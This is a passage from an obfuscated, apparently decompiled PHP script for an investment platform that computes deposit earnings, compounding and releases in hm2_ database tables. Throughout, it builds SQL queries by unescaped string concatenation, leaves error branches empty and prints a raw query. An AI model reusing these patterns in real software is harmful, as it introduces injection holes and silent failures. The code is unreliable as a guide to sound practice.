                                        $q = "insert into hm2_history set user_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcPqCb']].",\r\n                      amount = -{$elnlcaoFzc},\r\n                      type = 'penality',\r\n                      description = 'Earning moved to Stocks account',\r\n                      actual_amount = -{$elnlcaoFzc},\r\n                      date = '".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA},\r\n                      ec = ".$elnlcPSitf[$elnlcbhAzL['elnlcLlqz']].",\r\n                      str = 'gg',\r\n                      deposit_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                                        if ( !mysql_query( $q ) )
                                        {
                                        }
                                        $q = "insert into sh2_history set user_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcPqCb']].",\r\n                      amount = {$elnlcaoFzc},\r\n                      type = 'bonus',\r\n                      description = 'Earning received to buy shares',\r\n                      actual_amount = {$elnlcaoFzc},\r\n                      date = '".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA},\r\n                      ec = ".$elnlcPSitf[$elnlcbhAzL['elnlcLlqz']].",\r\n                      str = 'gg'";
                                        if ( !mysql_query( $q ) )
                                        {
                                        }
                                    }
                                }
                            }
                        }
                        $elnlcooIpx = "";
                        if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcipPS'] )
                        {
                            if ( $elnlcPSitf[$elnlcbhAzL['elnlcQeSi']] == 0 || $elnlcPSitf[$elnlcbhAzL['elnlcQeSi']] && $elnlcPSitf[$elnlcbhAzL['elnlcQKWvM']] )
                            {
                                $elnlcooIpx = ", status = 'off'";
                            }
                            if ( $elnlcPSitf[$elnlcbhAzL['elnlcUFbp']] == 1 && ( $elnlcPSitf[$elnlcbhAzL['elnlcQeSi']] == 0 || $elnlcPSitf[$elnlcbhAzL['elnlcQeSi']] && $elnlcPSitf[$elnlcbhAzL['elnlcQKWvM']] ) )
                            {
                                $elnlcSdFR = $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']];
                                $q = "insert into hm2_history set user_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcPqCb']].",\r\n                    amount = ".$elnlcPSitf[$elnlcbhAzL['elnlcowtbp']].",\r\n                    type='release_deposit',\r\n                    actual_amount = ".$elnlcSdFR.",\r\n                    ec = ".$elnlcPSitf[$elnlcbhAzL['elnlcLlqz']].",\r\n                    date = '{$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]}' + interval {$elnlcWtdA},\r\n                    deposit_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']].",\r\n                    description = 'Deposit release'";
                                if ( !mysql_query( $q ) )
                                {
                                }
                                if ( $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcaTnnD'] && 0 < $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] )
                                {
                                    $q = "select sum(actual_amount) as amt from hm2_history where deposit_id = {$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']]} and type = 'earning' and user_id = {$elnlcPSitf[$elnlcbhAzL['elnlcPqCb']]}";
                                    print $q;
                                    if ( !( $elnlcOMEDE = mysql_query( $q ) ) )
                                    {
                                    }
                                    $elnlcHHajh = $elnlcbhAzL['elnlcSFKV'];
                                    while ( $elnlckqRq = mysql_fetch_array( $elnlcOMEDE ) )
                                    {
                                        $elnlcHHajh = $elnlckqRq[$elnlcbhAzL['elnlcMygIP']];
                                    }
                                    $elnlcFEmDy = ( $elnlcSdFR + $elnlcHHajh ) * $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] / 100;
                                    $elnlcDIbqv = intval( $elnlcPSitf[$elnlcbhAzL['elnlcrplh']] );
                                    $q = "insert into hm2_deposits set \r\n\t\t           user_id = {$elnlcPSitf[$elnlcbhAzL['elnlcPqCb']]},\r\n\t\t           type_id = {$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]},\r\n\t\t           deposit_date = '{$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]}' + interval {$elnlcWtdA},\r\n\t\t           last_pay_date = ('{$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]}' + interval {$elnlcWtdA}) + interval {$elnlcDIbqv} day,\r\n\t\t           status = 'on',\r\n\t\t           amount = {$elnlcFEmDy},\r\n\t\t           actual_amount = {$elnlcFEmDy},\r\n\t\t           compound = 0,\r\n\t\t           ec = {$elnlcPSitf[$elnlcbhAzL['elnlcLlqz']]}    ";
                                    if ( !mysql_query( $q ) )
                                    {
                                    }
                                    $elnlcqaqH = mysql_insert_id( );
                                    $q = "insert into hm2_history set \r\n\t\t           user_id = {$elnlcPSitf[$elnlcbhAzL['elnlcPqCb']]},\r\n\t\t           amount = -{$elnlcFEmDy},\r\n\t\t           actual_amount = -{$elnlcFEmDy},\r\n\t\t           type='deposit',\r\n\t\t           date = '{$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]}' + interval {$elnlcWtdA},\r\n\t\t           description = 'Deposit (reinvest)',\r\n\t\t           ec = {$elnlcPSitf[$elnlcbhAzL['elnlcLlqz']]},\r\n\t\t           deposit_id = {$elnlcqaqH}    ";
                                    if ( !mysql_query( $q ) )
                                    {
                                    }
                                }
                            }
                        }
                        else
                        {
                            if ( 5 <= $elnlcStkU && $elnlcPSitf[$elnlcbhAzL['elnlcfbihT']] == 1 )
                            {
                            }
                            else
                            {
                                if ( 0 < $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] && $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] <= 100 && $elnlcPSitf[$elnlcbhAzL['elnlcVcEzr']] == 1 )
                                {
                                    if ( $elnlcPSitf[$elnlcbhAzL['elnlcvpTI']] == 0 )
                                    {
                                        $elnlcPSitf[$elnlcbhAzL['elnlcvpTI']] = $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] + 1;
                                    }
                                    if ( $elnlcPSitf[$elnlcbhAzL['elnlcfVHWz']] <= $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] && $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] <= $elnlcPSitf[$elnlcbhAzL['elnlcvpTI']] )
                                    {
                                        if ( $elnlcPSitf[$elnlcbhAzL['elnlcQaJPf']] == 1 )
                                        {
                                            $elnlcBtEC = preg_split( "/\\s*,\\s*/", $elnlcPSitf[$elnlcbhAzL['elnlcUwMaB']] );
                                            if ( !in_array( $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']], $elnlcBtEC ) )
                                            {
                                                $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] = $elnlcBtEC[0];
                                            }
                                        }
                                        else
                                        {
                                            if ( $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] < $elnlcPSitf[$elnlcbhAzL['elnlcpFPq']] )
                                            {
                                                $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] = $elnlcPSitf[$elnlcbhAzL['elnlcpFPq']];
                                            }
                                            if ( $elnlcPSitf[$elnlcbhAzL['elnlcscIHA']] < $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] )
                                            {
                                                $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] = $elnlcPSitf[$elnlcbhAzL['elnlcscIHA']];
                                            }
                                        }
                                    }
                                    else
                                    {
                                        $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] = $elnlcbhAzL['elnlcSFKV'];
                                    }
                                    if ( 0 < $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] && $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] <= 100 )
                                    {
                                        $elnlczpPvP = $elnlczQGd * $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] / 100;
                                        $elnlczQGd = floor( ( floor( $elnlczQGd * 100000 ) / 100000 - floor( $elnlczpPvP * 100000 ) / 100000 ) * 100 ) / 100;
                                        if ( $elnlcDIoHk[$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]] == 0 || $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] + $elnlczpPvP < $elnlcDIoHk[$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]] )
                                        {
                                            $q = "insert into hm2_history set user_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcPqCb']].",\r\n                        amount = -{$elnlczpPvP},\r\n                    \t\ttype='deposit',\r\n                    \t\tdescription = 'Compounding deposit',\r\n                    \t\tactual_amount = -{$elnlczpPvP},\r\n                    \t\tec = ".$elnlcPSitf[$elnlcbhAzL['elnlcLlqz']].",\r\n                    \t\tdate = '".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA},\r\n                                deposit_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                                            if ( !mysql_query( $q ) )
                                            {
                                            }
                                            $q = "update hm2_deposits set amount = amount + {$elnlczpPvP},\r\n                    \t\tactual_amount = actual_amount + {$elnlczpPvP}\r\n                    \t\twhere id = ".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                                            if ( !mysql_query( $q ) )
                                            {
                                            }
                                        }
                                    }
                                }
                                elnlcyioda( $elnlcPSitf[$elnlcbhAzL['elnlcIGomq']], $elnlczQGd, "date = '".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA}" );
                            }
                        }
                        $q = "update hm2_deposits set \r\n      \tq_pays = q_pays + 1, \r\n      \tlast_pay_date = last_pay_date + interval {$elnlcWtdA} {$elnlcooIpx} where id =".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                        if ( !mysql_query( $q ) )
                        {
                        }
                    }
                } while ( 1 );
            }
            if ( $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcnzRUV'] )
            {
                $q = "select * from hm2_types where q_days > 0 and pay_by_button != 1";
            }
            else
            {
                $q = "select * from hm2_types where q_days > 0";
            }
            $elnlcRLPe = mysql_query( $q );
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $elnlcgsDC = $elnlcPSitf[$elnlcbhAzL['elnlcQDdo']] + $elnlcPSitf[$elnlcbhAzL['elnlcrplh']] - ( 0 < $elnlcPSitf[delay] ? 1 : 0 );
                $elnlclrarK = $elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                if ( $elnlcPSitf[$elnlcbhAzL['elnlcUFbp']] == 1 )
                {
                    $q = "select * from hm2_deposits where \r\n                type_id = {$elnlclrarK} and \r\n                status = 'on' and \r\n                user_id = {$elnlcBpRxC} and \r\n                (deposit_date + interval {$elnlcgsDC} ".( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] ? "hour" : "day" )." < last_pay_date or deposit_date + interval {$elnlcgsDC} ".( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] ? "hour" : "day" )." < now()) and\r\n                (({$elnlcPSitf[$elnlcbhAzL['elnlcQeSi']]} = 0) || ({$elnlcPSitf[$elnlcbhAzL['elnlcQeSi']]} && (deposit_date + interval {$elnlcPSitf[$elnlcbhAzL['elnlcKryj']]} ".( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] ? "hour" : "day" )." < now())))\r\n             ";
                    $elnlcHAEbv = mysql_query( $q );
                    while ( $elnlcukjg = mysql_fetch_array( $elnlcHAEbv ) )
                    {
                        $elnlcSdFR = $elnlcukjg[$elnlcbhAzL['elnlcowtbp']];
                        $elnlcdkVUh = "Deposit return";
                        if ( $elnlcPSitf[$elnlcbhAzL['elnlcMmqF']] != 0 )
                        {
                            $elnlcSdFR = floor( $elnlcukjg[$elnlcbhAzL['elnlcowtbp']] * ( 100 - $elnlcPSitf[$elnlcbhAzL['elnlcMmqF']] ) ) / 100;
                            $elnlcdkVUh = "Deposit return. {$elnlcPSitf[$elnlcbhAzL['elnlcMmqF']]}% holded.";
                        }
                        $q = "insert into hm2_history set\r\n                user_id = ".$elnlcukjg[$elnlcbhAzL['elnlcPqCb']].",\r\n      \t\tamount = ".$elnlcSdFR.",\r\n      \t\ttype='release_deposit',\r\n      \t\tactual_amount = ".$elnlcSdFR.",\r\n                ec = ".$elnlcukjg[$elnlcbhAzL['elnlcLlqz']].",\r\n      \t\tdate = '".$elnlcukjg[$elnlcbhAzL['elnlcwtbS']]."' + interval {$elnlcgsDC} ".( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] ? "hour" : "day" ).",\r\n                deposit_id = ".$elnlcukjg[$elnlcbhAzL['elnlcIGomq']].",\r\n                description = '{$elnlcdkVUh}'";
                        if ( !mysql_query( $q ) )
                        {
                        }
                    }
                }
                $q = "update hm2_deposits set status='off' where \r\n             user_id = {$elnlcBpRxC} and \r\n    \t       (deposit_date + interval {$elnlcgsDC} ".( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] ? "hour" : "day" )." < last_pay_date or deposit_date + interval {$elnlcgsDC} ".( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] ? "hour" : "day" )." < now()) and\r\n             (({$elnlcPSitf[$elnlcbhAzL['elnlcQeSi']]} = 0) || ({$elnlcPSitf[$elnlcbhAzL['elnlcQeSi']]} && (deposit_date + interval {$elnlcPSitf[$elnlcbhAzL['elnlcKryj']]} ".( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] ? "hour" : "day" )." < now()))) and\r\n             type_id = {$elnlclrarK}\r\n           ";
                if ( !mysql_query( $q ) )
                {
                }
            }
            flock( $elnlclfiDM, LOCK_UN );
            fclose( $elnlclfiDM );
            unlink( "./tmpl_c/lock_user{$elnlcBpRxC}" );
        }
    }
}

function elnlcafwgb( $elnlcomuon )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    $elnlcySAk = array( );
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcbpUa']] == 1 && $elnlcomuon != -2 )
    {
    }
    else
    {
        $q = "select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = 'on' and hm2_types.id = hm2_plans.parent order by parent, min_deposit";
        if ( !( $elnlcRLPe = mysql_query( $q ) ) )
        {
        }
        while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
        {
            $elnlcySAk[$elnlcPSitf[$elnlcbhAzL['elnlcxFqC']]][$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']]] = $elnlcPSitf;
        }
        $elnlcbUPoI = $elnlcbhAzL['elnlcRlJry'];
        $elnlcVDoJN = "u.last_access_time + interval 30 minute < now() ";
        if ( $elnlcomuon == -1 )
        {
            $elnlcVDoJN = "1 = 1";
            $q = "select * from hm2_users where l_e_t + interval 15 minute < now() and status = 'on'";
        }
        else
        {
            $q = "select * from hm2_users where id = {$elnlcomuon} and status = 'on'";
        }
        if ( $elnlcomuon == -2 )
        {
            $q = "select * from hm2_users where status = 'on'";
            $q = "select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id";
        }
        if ( !( $elnlchwCbb = mysql_query( $q ) ) )
        {
        }
        while ( $elnlcEhri = mysql_fetch_array( $elnlchwCbb ) )
        {
            $elnlcBpRxC = $elnlcEhri[$elnlcbhAzL['elnlcIGomq']];
            $q = "update hm2_users set l_e_t = now() where id = {$elnlcBpRxC}";
            if ( !mysql_query( $q ) )
            {
            }
            $elnlcbUPoI = $elnlcbhAzL['elnlcRlJry'];
            while ( 0 < $elnlcbUPoI )
            {
                $q = "select \r\n              d.*, \r\n              t.period as period, t.use_compound as use_compound,\r\n              t.compound_min_deposit, t.compound_max_deposit,\r\n              t.compound_min_percent, t.compound_max_percent,\r\n              t.compound_percents_type, t.compound_percents,\r\n              t.work_week as work_week,\r\n              t.q_days as q_days, t.withdraw_principal,\r\n              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,\r\n              t.return_profit as return_profit\r\n            from\r\n              hm2_deposits as d,\r\n              hm2_types as t,\r\n              hm2_users as u\r\n            where \r\n              u.id = {$elnlcBpRxC} and \r\n              u.status = 'on' and \r\n              d.status='on' and \r\n              d.type_id = t.id and \r\n              t.status = 'on' and \r\n              u.id = d.user_id and\r\n              (((t.q_days + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / (60*60*24))) or t.q_days = 0) and \r\n              (\r\n                (d.last_pay_date + interval 1 hour <= now() and t.period = 'h')or\r\n                (d.last_pay_date + interval 1 day <= now() and t.period = 'd')or\r\n                (d.last_pay_date + interval 7 day <= now() and t.period = 'w') or\r\n                (d.last_pay_date + interval 14 day <= now() and t.period = 'b-w') or\r\n                (d.last_pay_date + interval 1 month <= now() and t.period = 'm') or\r\n                (d.last_pay_date + interval 2 month <= now() and t.period = '2m') or\r\n                (d.last_pay_date + interval 3 month <= now() and t.period = '3m') or\r\n                (d.last_pay_date + interval 6 month <= now() and t.period = '6m') or\r\n                (d.last_pay_date + interval 1 year <= now() and t.period = 'y') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day <= now() and t.period = 'end') \r\n              ) and\r\n              ((t.q_days = 0) or \r\n                (               \r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date  and t.period = 'h') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date  and t.period = 'd') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = 'w') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = 'b-w') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = 'm') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = '2m') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = '3m') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = '6m') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = 'y') or\r\n                (t.q_days > 0 and t.period = 'end') \r\n              ))";
                if ( !( $elnlcRLPe = mysql_query( $q ) ) )
                {
                }
                $elnlcbUPoI = $elnlcbhAzL['elnlcSFKV'];
                do
                {
                    if ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
                    {
                        ++$elnlcbUPoI;
                        if ( !isset( $elnlcySAk[$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]] ) )
                        {
                            continue;
                        }
                        $elnlcWsKAT = $elnlcbhAzL['elnlcSFKV'];
                        $elnlcitPK = $elnlcbhAzL['elnlcSFKV'];
                        reset( $elnlcySAk );
                        reset( $elnlcySAk[$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]] );
                        $elnlcBsLS = each( $elnlcySAk[$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]] )[1];
                        $elnlchcOIm = each( $elnlcySAk[$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]] )[0];
                        while ( each( $elnlcySAk[$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]] ) )
                        {
                            if ( $elnlcBsLS[$elnlcbhAzL['elnlchHBj']] <= $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] && ( $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] <= $elnlcBsLS[$elnlcbhAzL['elnlcMLzNf']] || $elnlcBsLS[$elnlcbhAzL['elnlcMLzNf']] == 0 ) )
                            {
                                $elnlcWsKAT = $elnlcBsLS[$elnlcbhAzL['elnlcgFxbx']];
                            }
                            if ( $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] < $elnlcBsLS[$elnlcbhAzL['elnlchHBj']] && $elnlcWsKAT == 0 )
                            {
                                $elnlcWsKAT = $elnlcitPK;
                            }
                            if ( $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] < $elnlcBsLS[$elnlcbhAzL['elnlchHBj']] && 0 < $elnlcWsKAT )
                            {
                                break;
                            }
                            $elnlcitPK = $elnlcBsLS[$elnlcbhAzL['elnlcgFxbx']];
                        }
                        if ( $elnlcBsLS[$elnlcbhAzL['elnlcMLzNf']] != 0 && $elnlcBsLS[$elnlcbhAzL['elnlcMLzNf']] < $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] )
                        {
                            $elnlcWsKAT = $elnlcitPK;
                        }
                        $elnlczQGd = $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] * $elnlcWsKAT / 100;
                        $elnlcWtdA = "";
                        if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcWjfoP'] )
                        {
                            $elnlcWtdA = " 1 day ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] )
                        {
                            $elnlcWtdA = " 1 hour ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcwsmEy'] )
                        {
                            $elnlcWtdA = " 7 day ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == "b-w" )
                        {
                            $elnlcWtdA = " 14 day ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcwRWaa'] )
                        {
                            $elnlcWtdA = " 1 month ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlccrvf'] )
                        {
                            $elnlcWtdA = " 2 month ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyahNc'] )
                        {
                            $elnlcWtdA = " 3 month ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlczvayB'] )
                        {
                            $elnlcWtdA = " 6 month ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlctoLR'] )
                        {
                            $elnlcWtdA = " 1 year ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcipPS'] )
                        {
                            $elnlcWtdA = " ".$elnlcPSitf[$elnlcbhAzL['elnlcQDdo']]." day ";
                        }
                        if ( $elnlcWsKAT == 0 && $elnlcWtdA == "" )
                        {
                            continue;
                        }
                        $elnlcStkU = -1;
                        $q = "select weekday('".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA}) as dw";
                        if ( !( $elnlclKGO = mysql_query( $q ) ) )
                        {
                        }
                        while ( $elnlcfEdPE = mysql_fetch_array( $elnlclKGO ) )
                        {
                            $elnlcStkU = $elnlcfEdPE[$elnlcbhAzL['elnlclkwD']];
                        }
                        $q = "select count(id) as col from hm2_history where ".( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] ? " date_format(date, '%Y-%m-%d  %H') = date_format('".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA}, '%Y-%m-%d  %H') and" : "to_days(date) = to_days('".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA}) and " )." deposit_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                        if ( !( $elnlcchef = mysql_query( $q ) ) )
                        {
                        }
                        $elnlcLnDHe = $elnlcbhAzL['elnlcSFKV'];
                        while ( $elnlcyjJG = mysql_fetch_array( $elnlcchef ) )
                        {
                            $elnlcLnDHe = $elnlcyjJG[$elnlcbhAzL['elnlczFIa']];
                        }
                        if ( $elnlcLnDHe == 0 )
                        {
                            if ( 5 <= $elnlcStkU && $elnlcPSitf[$elnlcbhAzL['elnlcfbihT']] == 1 )
                            {
                                $q = "insert into hm2_history set user_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcPqCb']].",\r\n                    amount = 0,\r\n                    type = 'earning',\r\n                    description = 'No interest on ".( $elnlcStkU == 5 ? "Saturday" : "Sunday" )."',\r\n                    actual_amount = 0,\r\n                    date = '".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA},\r\n                    ec = ".$elnlcPSitf[$elnlcbhAzL['elnlcLlqz']].",\r\n                    str = 'gg',\r\n                    deposit_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                            }
                            else
                            {
                                $q = "insert into hm2_history set user_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcPqCb']].",\r\n                    amount = {$elnlczQGd},\r\n                    type = 'earning',\r\n                    description = 'Earning from deposit ".$elnlctVnzQ[$elnlcbhAzL['elnlcQsqts']].number_format( $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']], 2 )." - {$elnlcWsKAT} %',\r\n                    actual_amount = {$elnlczQGd},\r\n                    date = '".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA},\r\n                    ec = ".$elnlcPSitf[$elnlcbhAzL['elnlcLlqz']].",\r\n                    str = 'gg',\r\n                    deposit_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                            }
                        }
                        if ( !mysql_query( $q ) )
                        {
                        }
                        $elnlcooIpx = "";
                        if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcipPS'] )
                        {
                            if ( $elnlcPSitf[$elnlcbhAzL['elnlcQeSi']] == 0 || $elnlcPSitf[$elnlcbhAzL['elnlcQeSi']] && $elnlcPSitf[$elnlcbhAzL['elnlcQKWvM']] )
                            {
                                $elnlcooIpx = ", status = 'off'";
                            }
                            if ( $elnlcPSitf[$elnlcbhAzL['elnlcUFbp']] == 1 && ( $elnlcPSitf[$elnlcbhAzL['elnlcQeSi']] == 0 || $elnlcPSitf[$elnlcbhAzL['elnlcQeSi']] && $elnlcPSitf[$elnlcbhAzL['elnlcQKWvM']] ) )
                            {
                                $q = "insert into hm2_history set user_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcPqCb']].",\r\n                    amount = ".$elnlcPSitf[$elnlcbhAzL['elnlcowtbp']].",\r\n                    type='release_deposit',\r\n                    actual_amount = ".$elnlcPSitf[$elnlcbhAzL['elnlcowtbp']].",\r\n                    ec = ".$elnlcPSitf[$elnlcbhAzL['elnlcLlqz']].",\r\n                    date = '".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA},\r\n                    deposit_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                                if ( !mysql_query( $q ) )
                                {
                                }
                            }
                        }
                        else
                        {
                            if ( 5 <= $elnlcStkU && $elnlcPSitf[$elnlcbhAzL['elnlcfbihT']] == 1 )
                            {
                            }
                            else
                            {
                                if ( 0 < $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] && $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] <= 100 && $elnlcPSitf[$elnlcbhAzL['elnlcVcEzr']] == 1 )
                                {
                                    if ( $elnlcPSitf[$elnlcbhAzL['elnlcvpTI']] == 0 )
                                    {
                                        $elnlcPSitf[$elnlcbhAzL['elnlcvpTI']] = $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] + 1;
                                    }
                                    if ( $elnlcPSitf[$elnlcbhAzL['elnlcfVHWz']] <= $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] && $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] <= $elnlcPSitf[$elnlcbhAzL['elnlcvpTI']] )
                                    {
                                        if ( $elnlcPSitf[$elnlcbhAzL['elnlcQaJPf']] == 1 )
                                        {
                                            $elnlcBtEC = preg_split( "/\\s*,\\s*/", $elnlcPSitf[$elnlcbhAzL['elnlcUwMaB']] );
                                            if ( !in_array( $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']], $elnlcBtEC ) )
                                            {
                                                $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] = $elnlcBtEC[0];
                                            }
                                        }
                                        else
                                        {
                                            if ( $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] < $elnlcPSitf[$elnlcbhAzL['elnlcpFPq']] )
                                            {
                                                $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] = $elnlcPSitf[$elnlcbhAzL['elnlcpFPq']];
                                            }
                                            if ( $elnlcPSitf[$elnlcbhAzL['elnlcscIHA']] < $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] )
                                            {
                                                $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] = $elnlcPSitf[$elnlcbhAzL['elnlcscIHA']];
                                            }
                                        }
                                    }
                                    else
                                    {
                                        $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] = $elnlcbhAzL['elnlcSFKV'];
                                    }
                                    if ( 0 < $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] && $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] <= 100 )
                                    {
                                        $elnlczpPvP = $elnlczQGd * $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] / 100;
